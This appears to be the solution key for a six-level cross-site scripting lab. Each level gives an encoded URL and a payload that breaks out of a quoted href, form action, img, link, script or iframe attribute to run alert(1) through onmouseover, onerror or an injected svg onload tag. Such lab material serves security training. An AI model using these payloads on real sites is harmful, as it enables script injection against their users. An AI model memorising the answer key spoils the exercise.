# url-param-ctx — solutions

Reflection inside URL query parameter values placed in href/src/action attributes; break out of the attribute.

### url-param-ctx-level1

`/url-param-ctx/level1/?query=%22%20onmouseover=alert(1)%20x=%22`

- payload: `" onmouseover=alert(1) x="`
- context: a href URL param value — break double-quoted attr

### url-param-ctx-level2

`/url-param-ctx/level2/?query=%22%20onmouseover=alert(1)%20x=%22`

- payload: `" onmouseover=alert(1) x="`
- context: form action URL param value — break double-quoted attr

### url-param-ctx-level3

`/url-param-ctx/level3/?query=%22%20onerror=alert(1)%20x=%22`

- payload: `" onerror=alert(1) x="`
- context: img src URL param value — break attr, onerror on bad src

### url-param-ctx-level4

`/url-param-ctx/level4/?query=%22%3E%3Csvg%20onload=alert(1)%3E`

- payload: `"><svg onload=alert(1)>`
- context: link href URL param value — escape link tag entirely

### url-param-ctx-level5

`/url-param-ctx/level5/?query=%22%3E%3C/script%3E%3Csvg%20onload=alert(1)%3E`

- payload: `"></script><svg onload=alert(1)>`
- context: script src URL param — close attr+script then inject

### url-param-ctx-level6

`/url-param-ctx/level6/?query=%22%3E%3Csvg%20onload=alert(1)%3E`

- payload: `"><svg onload=alert(1)>`
- context: iframe src URL param — break out, inject sibling tag
